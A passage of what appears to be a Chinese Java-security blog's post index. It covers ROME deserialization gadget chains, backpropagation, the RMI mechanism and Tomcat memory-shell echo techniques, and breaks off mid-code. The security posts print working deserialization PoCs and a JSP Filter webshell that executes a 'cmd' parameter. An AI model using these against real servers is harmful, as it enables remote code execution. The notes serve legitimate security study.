toStringBean = new ToStringBean(Templates.class, templates);\n\t\tBadAttributeValueExpException expException = new BadAttributeValueExpException(123);\n\t\tReflect.setValue(expException,\"val\",toStringBean);\n\t\treturn expException;\n\t}\n```\n<a name=\"XPyBK\"></a>\n### HotSwappableTargetSource利用链\n这条是spring原生的toString利用链，调用链如下\n```java\n* HashMap.readObject\n* HashMap.putVal\n* HotSwappableTargetSource.equals\n* XString.equals\n* ToStringBean.toString\n```\n需要有Spring-aop依赖<br />poc\n```java\npublic static Object HotSwappableTargetSourceGadget()throws Exception{\n\t\tTemplatesImpl templates = new TemplatesImpl();\n\t\tReflect.setValue(templates,\"_name\",\"aaa\");\n\t\tReflect.setValue(templates,\"_bytecodes\",new byte[][]{EvilClassTable.TemplateClass()});\n\t\tReflect.setValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\t\tToStringBean toStringBean = new ToStringBean(Templates.class, templates);\n\t\tHotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);\n\t\tHotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString(\"xxx\"));\n\n\t\tHashMap<Object,Object> hashMap = new HashMap<>();\n\t\thashMap.put(h1,h1);\n\t\thashMap.put(h2,h2);\n\t\treturn hashMap;\n\t}\n```\nHashMap#putVal<br />HashMap反序列化一个节点的key，和value后就会放入hashmap中<br />后面的元素的key肯定要跟前面的比较是否key重复<br /><img src=\"/img/4-11/15.png\" >\n\n跟进HotSwappableTargetSource#equal<br /><img src=\"/img/4-11/16.png\" ><br />当两个节点的key都是HotSwappableTargetSource时,就会比较target<br />前面那个的target为XString<br />进入Xstring#equal<br /><img src=\"/img/4-11/17.png\" ><br />可以看到会调用后面那个的toSting,因此hashmap前面的key中的target为toStingBean<br />那就接着后面的链子<br />因此2个节点放入hashmap中的顺序也很重要<br />会走第二个放入的equal方法，第二个包装的应该是Xtring,第一个包装的是ToStingBean\n<a name=\"pQ7VA\"></a>\n### JdbcRowSetImpl利用链\nJdbcRowSetImpl利用链是针对后半段TemplatesImpl.getOutputProperties()任意类加载进行替换的。JdbcRowSetImpl利用链的结果是能造成JNDI注入，于是下面就可以配合RMI或者LDAP服务进行攻击了。<br />由于JDNI注入中trustURLCodebase的限制，这里限制的攻击版本为\n\n- RMI：JDK 6u132、JDK 7u122、JDK 8u113之前\n- LDAP：JDK 7u201、8u191、6u211、JDK 11.0.1之前\n\n我们知道，在Fastjson反序列化漏洞中能造成JNDI注入的同样是JdbcRowSetImpl这条链。问题出在JdbcRowSetImpl.getDatabaseMetaData()这个getter上<br /><img src=\"/img/4-11/18.png\" ><br />connect中有使用lookup<br /><img src=\"/img/4-11/19.png\" >\n\n\n<a name=\"NUrGH\"></a>\n## Reference\n\n- [Java安全学习——ROME反序列化 - 枫のBlog](https://goodapple.top/archives/1145)\n- [https://cjlusec.ldxk.edu.cn/2023/02/15/rome/](https://cjlusec.ldxk.edu.cn/2023/02/15/rome/)\n","tags":["java安全","反序列化","rome"],"categories":["java安全"]},{"title":"反向传播","url":"/2024/03/25/反向传播/","content":"\n\n\n\n# 反向传播\n\n\n\n\n<a name=\"SMMHj\"></a>\n## 简介\n[反向传播](https://zh.wikipedia.org/wiki/%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD%E7%AE%97%E6%B3%95)（英语：Backpropagation，缩写为BP）是“误差反向传播”的简称，是一种与最优化方法（如梯度下降法）结合使用的，用来**训练人工神经网络**的常见方法。该方法对网络中所有权重**计算损失函数的梯度**。这个梯度会反馈给最优化方法，用来更新权值以最小化损失函数。<br />反向传播要求有对每个输入值想得到的已知输出，来计算损失函数梯度。因此，它通常被认为是一种监督式学习方法，虽然它也用在一些无监督网络（如自动编码器）中。它是多层前馈网络的Delta规则的推广，可以用**链式法则**对每层迭代计算梯度。反向传播要求人工神经元（或“节点”）的**激励函数**可微。\n\n\n<a name=\"RbIqB\"></a>\n## 梯度下降与损失函数\n  损失函数，(Loss Function）在机器学习中的每一种算法中都很重要，因为训练模型的过程就是优化损失函数的过程，损失函数对每个参数的偏导数就是梯度下降中提到的梯度，防止过拟合时添加的正则化项也是加在损失函数后面的。<br />损失函数非常好理解，我觉得其实就是，反映神经网络输出的结果与训练样本的y之间的差别的函数（其中输入变量是神经网络的权重参数）。这个函数要具有一些特性，一般情况下，我们要尽可能的最小化损失函数，寻找损失函数的全局最小值，\n\n\n\n为了完成梯度下降<br /><img src=\"/img/3-25/1.svg\" ><br />我们需要求偏导\n\n\n<a name=\"epX0a\"></a>\n## 过程\n数学原理：基于复合函数求导的链式法则--<br />如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示；\n\n<a name=\"Lqqst\"></a>\n### 简单线性回归\n假设是 y=wx+b<br />其损失函数为<br /><img src=\"/img/3-25/2.svg\" >\n\n- 随机初始化参数 w,b\n- 将w,b视为变量，x,y为常量\n- 根据梯度下降,更新w,b\n\n<img src=\"/img/3-25/3.svg\" >、<br /><img src=\"/img/3-25/4.svg\" ><br />因此需计算出<img src=\"/img/3-25/5.svg\" >、<img src=\"/img/3-25/6.svg\" ><br />易得<img src=\"/img/3-25/7.svg\" >= x  ,  <img src=\"/img/3-25/8.svg\" > = 1<br />上面其实是现在的需求，根据链式法则<br /><img src=\"/img/3-25/9.svg\" ><br /><img src=\"/img/3-25/10.svg\" >\n\n如下图，已知数据(1.5,0.8)，初始化参数w=0.8,b=0.2<br />一轮运算后得到预测值y=1.4<br />如果先得出<img src=\"/img/3-25/11.svg\" >,接着往下运算得到目标结果<br /><img src=\"/img/3-25/12.png\" ><br />根据上图，<img src=\"/img/3-25/13.svg\" >= y - <img src=\"/img/3-25/14.svg\" >其中<img src=\"/img/3-25/15.svg\" >为真实值，y是预测值，根据上面一轮的正向传播（即根据给定的模型计算得出），得到<img src=\"/img/3-25/16.svg\" >=1.4 -0.8 = 0.6<br /><img src=\"/img/3-25/17.png\" ><br />然后<img src=\"/img/3-25/18.svg\" >=0.6 x 1.5= 0.9   <img src=\"/img/3-25/19.svg\" >=0.6<br />然后设置学习率<img src=\"/img/3-25/20.svg\" >=0.1 <br />更新w,b   w=0.8-0.1 x 0.9 = 0.71    b=0.2-0.1 x 0.6=0.14<br />然后照此迭代模型<br />这样由后往前地求偏导就是反向传播的过程，\n\n\n<a name=\"Qta8E\"></a>\n### 神经网络\n在一个神经网络中，其实就是上面简单线性回归变得稍微复杂，多加上了几层<br /><img src=\"/img/3-25/21.png\" ><br />反向传播，根据上面一步的运算求出下一层次的偏导<br />就如上图，黄色部分其实都是已经由之前的运算得出<br />反向传播算法就是神经网络中加快计算梯度值的方法\n<a name=\"jHjGe\"></a>\n## 计算图\n计算机中的运算并非就是上面图示的过程，因为很难对一个式子求偏导<br />，所以需要将式子拆开，由一个运算符连接得到计算图\n\n计算图将计算过程用图形表示出来，这里的图形是指数据结构图，通过多个节点和边表示<br />用计算图解题时，需要按如下流程进行:\n\n- 构建计算图；\n- 在计算图上从左到右进行计算(正向传播, forward propagation)；\n- 在计算图上从右到左进行计算(反向传播, backward propagation)；\n   - 将上游传过来的值E乘以节点的局部导数 <img src=\"/img/3-25/22.svg\" >，然后将结果传递给下一个节点\n\n计算图的优点:\n\n- 局部计算；\n   - 无论全局多么复杂的计算，都可以通过局部计算使各个节点致力于简单的计算，从而简化问题；\n- 利用计算图可以将中间的计算结果保存起来；\n- 可以通过反向传播高效计算导数；\n- 综上:可以通过正向传播和反向传播高效地计算各个变量的导数值；\n\n\n<img src=\"/img/3-25/23.png\" >\n\n由计算图，可以定义每中运算的数据结构<br />如在Pytourch中乘法运算可以如下定义：\n```python\nimport torch.autograd\n\nclass Multiply(torch.autograd.Function):\n    @staticmethod\n    def forward(ctx,x,y):\n        ctx.save_for_backward(x,y)\n        z = x * y\n        return z\n    \n    @staticmethod\n    def backward(ctx,grad_z):\n        x,y=ctx.save_tensors\n        grad_x = grad_z * y\n        grad_y = grad_z * x\n        return grad_x,grad_y\n```\nforward函数是前向传播，计算 z =x * y<br />backward函数是反向传播 ，由参数grad_z （由上一级的梯度<img src=\"/img/3-25/24.svg\" >）计算对x,y的偏导<br />由于z= x*y<br />因此<br /><img src=\"/img/3-25/25.svg\" ><br /><img src=\"/img/3-25/26.svg\" ><br />\n\n<img src=\"/img/3-25/27.png\" ><br />","tags":["机器学习","深度学习","神经网络","算法"]},{"title":"RMI机制","url":"/2024/03/18/RMI机制/","content":"\n\n\n\n# RMI机制\n\n\n\n<a name=\"TME8K\"></a>\n## 简介\n RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在**网络上的不同计算机中,**它的底层是由**socket**和**java序列化和反序列化**支撑起来的。  <br />它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。\n\n我们知道远程过程调用（Remote Procedure Call, RPC）可以用于一个进程调用另一个进程（很可能在另一个远程主机上）中的过程，从而提供了过程的分布能力。Java 的 RMI 则在 RPC 的基础上向前又迈进了一步，即提供分布式对象间的通讯。\n\nRMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。\n\n- Client-客户端：客户端调用服务端的方法\n- Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果\n- Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用（在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功）\n\n<a name=\"n8uMy\"></a>\n## RMI\n\n<a name=\"Pz24A\"></a>\n### 远程对象调用过程\n在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub（存根），Stub相当于远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节。而位于服务器端的Skeleton（骨架）,能够读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。所以RMI远程调用逻辑大致是这样的<br /><img src=\"/img/3-18/1.png\" ><br />从逻辑上来看，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。\n\n具体的通信流程如下\n\n- Server监听一个端口，这个端口是JVM随机选择的\n- Client并不知道Server远程对象的通信地址和端口，但是位于Client的Stub中包含了这些信息，并封装了底层网络操作。Client可以调用Stub上的方法，并且也可以向Stub发送方法参数。\n- Stub连接到Server监听的通信端口并提交参数\n- Server执行具体的方法，并将结果返回给Stub\n- Stub返回执行结果给Client。因此在Clinet看来，就好像是Stub在本地执行了这个方法。\n\n位于Client上的Stub获取到远程Server的通信信息的需要使用RMI Registry了\n<a name=\"wkAXR\"></a>\n### RMI Registry\n<a name=\"v3OhM\"></a>\n#### RMI Registry的注册\nJDK提供了一个RMI注册表（RMI Registry）来解决这个问题。RMI Registry也是一个远程对象，默认监听在1099端口上，可以使用代码启动RMI Registry，也可以使用rmiregistry命令。<br />要注册远程对象，需要RMI URL和一个远程对象的引用，如：\n```java\nprivate void register() throws Exception{\n        RMIHello rmiHello=new RMIHello();\n        LocateRegistry.createRegistry(1099);\n        Naming.bind(\"rmi://127.0.0.1:1099/hello\",rmiHello);\n    }\n```\n上面代码使用 LocateRegistry.createRegistry(port)在本地的某个端口上创建了一个Registry。最后使用Naming.bind()将实例化对象和地址上的hello绑定在一起，作为远程对象的名字。注意这里使用的是rmi://协议。\n<a name=\"Halo8\"></a>\n#### RMI Registry的使用\n注册完RMI Registry以后，我们将要调用的远程对象已经和服务器端的某个地址绑定在了一起。\n```java\npackage learn.rmi;\n \nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n \npublic class RMIClient {\n    public static void main(String[] args) throws Exception{\n        Registry registry= LocateRegistry.getRegistry(\"127.0.0.1\",1099);\n        IHello iHello=(IHello) registry.lookup(\"hello\");\n        System.out.println(iHello.sayHello(\"Feng\"));\n    }\n}\n```\nLocateRegistry.getRegistry()会使用给定的主机和端口等信息在本地创建一个Stub对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。这里我们使用了registry.lookup()来查询获取注册表中的远程对象。还有另一种写法<br />使用了RMI Registry后，RMI的调用关系如下<br /><img src=\"/img/3-18/2.png\" ><br />RMI调用流程<br />从客户端角度看，服务端应用是有两个端口的，一个是RMI Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的）。更详细的通信过程如下<br /><img src=\"/img/3-18/3.png\" >\n\n\n\n\n\n<a name=\"ROLIm\"></a>\n### 使用\n使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现java.io.Serializable接口，并且客户端的serialVersionUID字段要与服务器端保持一致。\n\n任何可以被远程调用方法的对象必须继承java.rmi.Remote接口，远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法，如下：\n\n1. 定义远程服务对象接口并继承Remote接口，需要将远程调用的方法定义在接口里面，并必须抛出RemoteException(否则会报错)\n```java\npackage com.yyjccc.jndi.RMI;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\n\npublic interface RMIService extends Remote {\n\n\tpublic String say() throws RemoteException;\n}\n\n```\n\n2. 定义上面接口的实现类并继承UnicastRemoteObject类\n```java\npackage com.yyjccc.jndi.RMI;\n\nimport java.rmi.RemoteException;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class MyService extends UnicastRemoteObject implements RMIService{\n\tprotected MyService() throws RemoteException {\n\t\tsuper();\n\t}\n\t@Override\n\tpublic String say()  {\n\t\tSystem.out.println(\"call say method\");\n\t\treturn \"hello\";\n\t}\n\n\t//      在没有继承UnicastRemoteObject的时候构造函数也可以写成如下形式\n//      protected RMIHello() throws RemoteException{\n//          UnicastRemoteObject.exportObject(this,0);\n//      }\n}\n\n```\n\n3. 定义RMI服务端并将对应的远程对象绑定到注册中心\n```java\npackage com.yyjccc.jndi.RMI;\n\nimport java.net.MalformedURLException;\nimport java.rmi.Naming;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\n\npublic class RMIServer {\n\tpublic static void main(String[] args) {\n\t\ttry {\n\t\t\tLocateRegistry.createRegistry(1099);\n\t\t\tNaming.rebind(\"rmi://127.0.0.1:1099/myObj\",new MyService());\n\t\t} catch (RemoteException | MalformedURLException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n\t}\n}\n\n```\n\n4. 定义RMI客户端，lookup获取远程对象并调用方法\n```java\npackage com.yyjccc.jndi.RMI;\n\nimport java.net.MalformedURLException;\nimport java.rmi.Naming;\nimport java.rmi.NotBoundException;\nimport java.rmi.RemoteException;\n\npublic class RMIClient {\n\tpublic static void main(String[] args) {\n\t\ttry {\n\t\t\tRMIService myService = (RMIService) Naming.lookup(\"rmi://127.0.0.1:1099/myObj\");\n\t\t\tmyService.say();\n\t\t\tSystem.out.println();\n\t\t} catch (NotBoundException | MalformedURLException | RemoteException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t} \n\t}\n}\n\n```\n\n客户端本地必须有远程对象的接口，不然无法指定要调用的方法，而且其**全限定名**必须与服务器上的对象完全相同\n\n<a name=\"Bs2XG\"></a>\n## JRMP协议\nJava远程方法协议（Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议。\n\n开启服务端，在开启WireShark抓包，再启动客户端调用，一次完整的RMI通信数据包如下<br /><img src=\"/img/3-18/4.png\" ><br />可以看到JRMP通信协议双方在完成确认后，随后Clinet向Registry发送”Call”信息，Registry回复”ReturnData”<br /><img src=\"/img/3-18/5.png\" ><br />我们看一下Registry的回复内容<br /><img src=\"/img/3-18/6.png\" ><br />这里传输的是服务器的java序列化数据。注意以上的部分。ac  ed是Java序列化的魔术头，该数据流往后的部分就是序列化的内容了。<br /><img src=\"/img/3-18/7.png\" ><br />06 3d转换成十进制为3075，这便是Server在本地开放的随机端口。\n\n\n<a name=\"lE4wC\"></a>\n## RMI流程分析\n<a name=\"dSsDs\"></a>\n### Registry端\n可以通过createRegistry()方法来创建一个Registry\n```java\nRegistry registry = LocateRegistry.createRegistry(1099);\n```\n可以看到，在创建Registry是返回的是RegistryImpl对象<br /><img src=\"/img/3-18/8.png\" ><br /><img src=\"/img/3-18/9.png\" ><br />跟进setup<br /><img src=\"/img/3-18/10.png\" ><br />继续跟进UnicastServerRef.exportObject():<br /><img src=\"/img/3-18/11.png\" >\n\n1. 创建stub\n\n<img src=\"/img/3-18/12.png\" ><br />加上_stub并进行实例化.RegistryImpl_Stub\n\n2. 创建Skeleton，这就是Server端处理 RMI Client 通信请求的具体操作类\n\n<img src=\"/img/3-18/13.png\" ><br />因此最终createRegistry()的结果就是返回了一个RegistryImpl对象，并且赋值this.skel=RegistryImpl_Skel。<br />完整过程如下：<br /><img src=\"/img/3-18/14.png\" >\n\n对远程对象的操作有以下5种\n\n- bind\n- list\n- lookup\n- rebind\n- unbind\n\n对于Registry端，操作远程对象其实就是操作HashTable，我们来看RegistryImpl中的bind操作<br /><img src=\"/img/3-18/15.png\" ><br />binddings属性其实就是一个HashTable<br />Registry使用的这张Hash表就类似于一张”路由表”，将name和绑定其上的远程对象联系了起来。<br /><img src=\"/img/3-18/16.png\" ><br />rebind和bind的区别在于后者不会覆盖以前已经绑定的对象\n<a name=\"zaE10\"></a>\n### Client端\n<a name=\"DkzY7\"></a>\n#### 获取Registry\n<img src=\"/img/3-18/17.png\" ><br />和使用如下代码效果一样\n```java\nRegistry registry = LocateRegistry.getRegistry(rmi,port);\nregistry.lookup(name);\n```\n上面都是先获取Registry,与Registry端不同的是这里还会做一层封装<br /><img src=\"/img/3-18/18.png\" ><br />得到的是RegistryImpl_Stub对象<br /><img src=\"/img/3-18/19.png\" >\n<a name=\"IAZWK\"></a>\n#### 操作远程对象\n在Client端，对远程对象的操作同样有以下5种<br /><img src=\"/img/3-18/20.png\" ><br />这里我们以RegistryImpl_Stub.bind操作为例进行分析<br /><img src=\"/img/3-18/21.png\" ><br />首先生成了一个RemoteCall通信对象来建立连接，注意参数里的opnum（操作数），上述5个操作中每一个操作都有一个opnum，这里bind操作的opnum为0。参数中的hash其实就是serializeID。<br />跟进newCall，在此时Client已经通过newConnection()和Server端建立了连接<br /><img src=\"/img/3-18/22.png\" ><br />然后Client通过StreamRemoteCall()提前将ObjID、opnum和serializeID发送给Server端\n\n回到bind中，可以看到使用了writeObject()将我们要发送的name以及Remote远程对象序列化发送了过去<br /><img src=\"/img/3-18/23.png\" ><br />再往下，bind中的invoke和done便是接收处理服务端返回的信息<br /><img src=\"/img/3-18/24.png\" >\n<a name=\"x9eMh\"></a>\n#### 完整流程\n<img src=\"/img/3-18/25.png\" >\n<a name=\"xAupV\"></a>\n### Server端\n我们知道，在RMI过程中，Server端往往是开启两个端口的，一个1099端口用于Registry，另一个是随机端口用于与Client通信。而远程方法最终是在Server端执行的，Server会把执行的结果返回给Client端。我们上面在创建Registry的时候已经生成了一个RegistryImpl_Skel对象，正是这个对象与Client端的RegistryImpl_Stub通信\n<a name=\"jURS7\"></a>\n#### 开启通信端口\n在创建我们的远程对象的时候，跟进构造方法<br /><img src=\"/img/3-18/26.png\" >\n\n到这里逐层跟进（有点套娃）<br /><img src=\"/img/3-18/27.png\" ><br /><img src=\"/img/3-18/28.png\" ><br />最后到TCPTransport.exportObject()，开始监听端口，跟进listen()<br /><img src=\"/img/3-18/29.png\" ><br />这里listen()启动了一个新的线程，跟进看看这个线程做了什么<br /><img src=\"/img/3-18/30.png\" ><br />直接在TCPTransport$AcceptLoop#run处打下断点<br /><img src=\"/img/3-18/31.png\" >此时已经从主线程到了RMI TCP Accept-0线程，调用了executeAcceptLoop()，跟进<br /><img src=\"/img/3-18/32.png\" ><br />在执行完this.serverSocket.accept()之后server才开始真正等待Client的连接\n<a name=\"AQoAT\"></a>\n#### 与Client通信\n紧接上文，我们在executeAcceptLoop()方法中的TCPTransport._connectionThreadPool_.execute()方法处下个断点，然后Client向Server发送连接请求，如下<br /><img src=\"/img/3-18/33.png\" ><br />这里创建了一个ConnectionHandler句柄，我们跟进ConnectionHandler句柄的run()方法，在TCPTransport.run()中<br /><img src=\"/img/3-18/34.png\" ><br />跟进run0()，最终到了该方法中的handleMessages()，这是用来传递消息的句柄<br /><img src=\"/img/3-18/35.png\" ><br />跟进，创建了StreamRemoteCall对象，跟进下面的serviceCall()方法<br /><img src=\"/img/3-18/36.png\" ><br />可以看到serviceCall()方法的参数是一个RemoteCall对象。这里就是Client传来的RemoteCall对象，然后对该对象进行各种操作，读取其中的信息。<br /><img src=\"/img/3-18/37.png\" ><br />最终会调用dispatch()方法<br /><img src=\"/img/3-18/38.png\" >\n\n然后调用oldDispatch()，最后跟到this.skel.dispatch()方法中。最终在RegistryImpl_Skel.dispatch()中根据Client发来的信息进行各种操作。<br /><img src=\"/img/3-18/39.png\" >\n\n<img src=\"/img/3-18/40.png\" ><br />最终在RegistryImpl_Skel.dispatch()进行了各种数据的反序列化\n<a name=\"OSFDj\"></a>\n#### 完整流程\n<img src=\"/img/3-18/41.png\" >\n\n## 参考：\n\n- [Java安全学习——RMI机制 - 枫のBlog](https://goodapple.top/archives/321)\n- [Notion – The all-in-one workspace for your notes, tasks, wikis, and databases.](https://ajdecade.notion.site/RMI-0-1-3aebd05c661f4c10876ef69d12506df6)\n- [RMI篇1 - Longlone’s Blog](https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%871/)\n\n","tags":["web安全","java安全","RMI"],"categories":["java安全"]},{"title":"内存马Tomcat回显","url":"/2024/03/16/内存马Tomcat回显/","content":"\n\n\n# 内存马Tomcat回显\n\n所谓回显，其实就是获取命令执行的结果，这种技术常用于目标机器不出网，无法反弹shell的情况。**其实关键就是获取request和response对象**。\n\n参考：\n\n- [Java安全学习——内存马 - 枫のBlog](https://goodapple.top/archives/1355)\n- [https://johnfrod.top/%e5%ae%89%e5%85%a8/java-%e5%9b%9e%e6%98%be%e6%8a%80%e6%9c%af/](https://johnfrod.top/%e5%ae%89%e5%85%a8/java-%e5%9b%9e%e6%98%be%e6%8a%80%e6%9c%af/)\n- [https://xz.aliyun.com/t/12494](https://xz.aliyun.com/t/12494)\n<a name=\"MpGXn\"></a>\n## 示例\n我们以上文提到的Tomcat Filter内存马为例，获取对应的回显，关键代码如下\n```java\n<%! public class Shell_Filter implements Filter {\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        String cmd = request.getParameter(\"cmd\");\n        response.setContentType(\"text/html; charset=UTF-8\");\n        PrintWriter writer = response.getWriter();\n        if (cmd != null) {\n            try {\n                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n                //将命令执行结果写入扫描器并读取所有输入\n                Scanner scanner = new Scanner(in).useDelimiter(\"\\\\A\");\n                String result = scanner.hasNext()?scanner.next():\"\";\n                scanner.close();\n                writer.write(result);\n                writer.flush();\n                writer.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            } catch (NullPointerException n) {\n                n.printStackTrace();\n            }\n        }\n        chain.doFilter(request, response);\n    }\n}\n%>\n```\n上述方式我们是通过JSP文件来注入内存马的。由于JSP中内置了一些关键对象，所以我们能够很容易地获得Request和Response对象，并能通过他们来获取目标JVM的上下文Context。\n\n针对于反序列化进行内存马注入来达到无文件落地的目的，而jsp的request和response可以直接获取，但是反序列化的时候却不能，所以回显问题便需要考虑其中。\n<a name=\"QoyvZ\"></a>\n## ThreadLocal Response回显\n首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在org.apache.catalina.core.ApplicationFilterChain类中找到这样两个变量_lastServicedRequest_和_lastServicedResponse_。并且这两个属性还是静态的，我们获取时无需实例化对象。<br /><img src=\"/img/3-16/1.png\" ><br />在我们熟悉的ApplicationFilterChain#internalDoFilter中，Tomcat会将request对象和response对象存储到这两个变量中\n\n在静态代码块中的ApplicationDispatcher.WRAP_SAME_OBJECT为false，但是我们后续可以通过反射修改。\n\n<img src=\"/img/3-16/2.png\" >\n\n在ApplicationFilterChain#internalDoFilter 中发现，当WRAP_SAME_OBJECT为 true时 ，就会通过set方法将请求信息存入 lastServicedRequest 和 lastServicedResponse中\n\n可以总结思路如下\n\n1. 反射修改ApplicationDispatcher.WRAP_SAME_OBJECT的值，通过ThreadLocal#set方法将request和response对象存储到变量中\n2. 初始化lastServicedRequest和lastServicedResponse两个变量，默认为null\n3. 通过ThreadLocal#get方法将request和response对象从_lastServicedRequest_和_lastServicedResponse_中取出\n\n\n反射修改static final<br />参考：<br />[https://johnfrod.top/%e5%ae%89%e5%85%a8/java%e5%8f%8d%e5%b0%84%e4%bf%ae%e6%94%b9static-final%e4%bf%ae%e9%a5%b0%e7%9a%84%e5%ad%97%e6%ae%b5/](https://johnfrod.top/%e5%ae%89%e5%85%a8/java%e5%8f%8d%e5%b0%84%e4%bf%ae%e6%94%b9static-final%e4%bf%ae%e9%a5%b0%e7%9a%84%e5%ad%97%e6%ae%b5/)\n```java\nField lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(\"lastServicedResponse\");\n//再次反射修改feild的modif\nField modifiersField = Field.class.getDeclaredField(\"modifiers\");\nmodifiersField.setAccessible(true);\n//去除final\nmodifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);\nlastServicedResponseField.setAccessible(true);\n\n```\n\n<a name=\"R39Ad\"></a>\n#### 反射存储request和response\n```java\n//反射获取所需属性\nField WRAP_SAME_OBJECT_FIELD = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\").getDeclaredField(\"WRAP_SAME_OBJECT\");\nField lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(\"lastServicedRequest\");\nField lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(\"lastServicedResponse\");\n \n//使用modifiersField反射修改final型变量\njava.lang.reflect.Field modifiersField = Field.class.getDeclaredField(\"modifiers\");\nmodifiersField.setAccessible(true);\nmodifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);\nmodifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);\nmodifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);\nWRAP_SAME_OBJECT_FIELD.setAccessible(true);\nlastServicedRequestField.setAccessible(true);\nlastServicedResponseField.setAccessible(true);\n \n//将变量WRAP_SAME_OBJECT_FIELD设置为true\nif (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)){\n    WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);\n}\n```\n<a name=\"rGsRw\"></a>\n#### 初始化变量\n由于变量在Tomcat初始化运行的时候会被设置为null，因此我们还需要初始化lastServicedRequest和lastServicedResponse变量为ThreadLocal类\n```java\nif (lastServicedRequestField.get(null)==null){\n    lastServicedRequestField.set(null, new ThreadLocal<>());\n}\n \nif (lastServicedResponseField.get(null)==null){\n    lastServicedResponseField.set(null, new ThreadLocal<>());\n}\n```\n<a name=\"jjAuo\"></a>\n#### 获取request、response变量\n```java\nif(lastServicedRequestField.get(null)!=null){\n    ThreadLocal threadLocalReq = (ThreadLocal) lastServicedRequestField.get(null);\n    ThreadLocal threadLocalRes =(ThreadLocal) lastServicedResponseField.get(null);\n    HttpServletRequest request = (HttpServletRequest) threadLocalReq.get();\n    HttpServletResponse response= (HttpServletResponse) threadLocalRes.get();\n\n   \n}\n```\n请求两次，第一次修改变量值，第二次获取Request\n<a name=\"HNztX\"></a>\n### 完整Poc\n```java\npackage com.yyjccc.memorytrojan.Echo;\n\nimport org.apache.catalina.connector.Response;\nimport org.apache.catalina.connector.ResponseFacade;\nimport org.apache.catalina.core.ApplicationFilterChain;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Modifier;\nimport java.util.Scanner;\n\n@WebServlet(\"/echo\")\npublic class Tomcat_Local extends HttpServlet {\n\t@Override\n\tprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n\n\t\ttry {\n\t\t\t//反射获取所需属性\n\t\t\tField WRAP_SAME_OBJECT_FIELD = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\").getDeclaredField(\"WRAP_SAME_OBJECT\");\n\t\t\tField lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(\"lastServicedRequest\");\n\t\t\tField lastServicedResponseField = 